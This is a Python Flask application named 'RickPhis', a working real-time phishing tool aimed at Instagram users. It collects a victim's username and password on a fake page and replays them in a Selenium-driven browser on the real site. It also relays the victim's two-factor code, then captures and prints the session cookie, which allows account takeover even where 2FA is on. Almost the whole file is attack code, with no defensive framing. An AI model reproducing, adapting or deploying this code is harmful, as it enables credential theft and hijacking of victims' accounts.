from flask import Flask, request, render_template, redirect, url_for, session
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from flask import Flask, redirect, request, make_response
from selenium.webdriver.support import expected_conditions as EC
import time, uuid, secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

logo = """  _____  _      _    _____  _     _     
 |  __ \\(_)    | |  |  __ \\| |   (_)    
 | |__) |_  ___| | _| |__) | |__  _ ___ 
 |  _  /| |/ __| |/ /  ___/| '_ \\| / __|
 | | \\ \\| | (__|   <| |    | | | | \\__ \\
 |_|  \\_\\_|\\___|_|\\_\\_|    |_| |_|_|___/
                                        """

print(logo)

def validate_length(field_name, value, max_length=150):
    if not value or len(value) > max_length:
        return f"{field_name} must be at most {max_length} characters long."
    return None

user_sessions = {}
# map; sid > class instance

chrome_options = Options()
chrome_options.add_argument("--disable-extensions")
chrome_options.add_argument("--start-maximized")
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("--disable-dev-shm-usage")
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-infobars")
chrome_options.add_argument("--disable-notifications")

class RickPhis:
    def __init__(self):
        self.driver = webdriver.Chrome(options=chrome_options)
        self.username = None
        self.password = None
        pass

    def login_insta(self, username, password):
        self.username = username
        self.password = password
        try:
            self.driver.get("https://www.instagram.com/")
            WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))

            username_field = self.driver.find_element(By.NAME, "username")
            username_field.send_keys(self.username)

            password_field = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.NAME, "password")))
            password_field.send_keys(self.password)

            login_button = WebDriverWait(self.driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']")))
            login_button.click()

            time.sleep(10)

            try:
                error_message = self.driver.find_element(By.CSS_SELECTOR, "div.xkmlbd1.xvs91rp.xd4r4e8.x1anpbxc.x1m39q7l.xyorhqc.x540dpk.x2b8uid").text
                if "Sorry, your password was incorrect." in error_message:
                    return "Login failed. The password or username is incorrect."
            except:
                try:
                    verification_message = self.driver.find_element(By.NAME, "verificationCode").get_attribute("aria-label")
                    if "Security Code" in verification_message:
                        return "Two-factor authentication"
                except:

                    cookies = self.driver.get_cookies()
                    session_id = None

                    for cookie in cookies:
                        if cookie['name'] == 'sessionid':
                            session_id = cookie['value']
                            break

                    if session_id:
                        print(f"Session ID: {session_id}")
                        return "An error occurred. Please try again later."

                    else:
                        return "An error occurred. Please try again later."

        except Exception as e:
            return f"An error occurred: {e}"    


@app.route('/', methods=['GET', 'POST'])
def login():
    priv_session_id = request.cookies.get('s_stream')
    if not priv_session_id:
        priv_session_id = secrets.token_hex(16)

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        error = validate_length("Username", username) or validate_length("Password", password)
        if error:

            response = make_response(render_template('index.html', result=error))
            response.set_cookie('s_stream', priv_session_id)
            return response

        if priv_session_id not in user_sessions:
            bot = RickPhis()
            user_sessions[priv_session_id] = bot
        else:
            bot = user_sessions[priv_session_id]

        result = bot.login_insta(username, password)

        if result == "Two-factor authentication":
            return redirect(url_for('two_factor'))

        response = make_response(render_template('index.html', result=result))
        response.set_cookie('s_stream', priv_session_id)
        return response

    response = make_response(render_template('index.html'))
    response.set_cookie('s_stream', priv_session_id)
    return response



@app.route('/2fa', methods=['GET'])
def two_factor():
    return render_template('2fa.html')


@app.route('/verify', methods=['POST'])
def verify_code():

    priv_session_id = request.cookies.get('s_stream')
    if not priv_session_id:
        priv_session_id = secrets.token_hex(16)
    if not priv_session_id or priv_session_id not in user_sessions:
        return "invalid session"
    
    bot = user_sessions[priv_session_id]
    driver = bot.driver

    if not driver:
        return "invalid session"

    security_code = request.form.get('security_code')
    error = validate_length("Verification code", security_code)

    if error:
        return render_template('2fa.html', result=error)

    try:
        code_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "verificationCode"))
        )
        code_input.send_keys(security_code)

        confirm_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "button._acan._acap._acas._aj1-._ap30"))
        )
        confirm_button.click()

        try:
            error_message = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.ID, "twoFactorErrorAlert"))
            )
            return render_template('2fa.html', result="Please check the security code and try again.")
        except:
            cookies = driver.get_cookies()
            session_id = None
            for cookie in cookies:
                if cookie['name'] == 'sessionid':
                    session_id = cookie['value']
                    break

            if session_id:
                print(f"Session ID: {session_id}")
                response = make_response(redirect("https://www.instagram.com"))
                response.set_cookie('session_id', session_id)
                return response
            else:
                return render_template('2fa.html', result="Verification successful but session ID not found.")
    except Exception as e:
        return render_template('2fa.html', result=f"An error occurred: {e}")


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
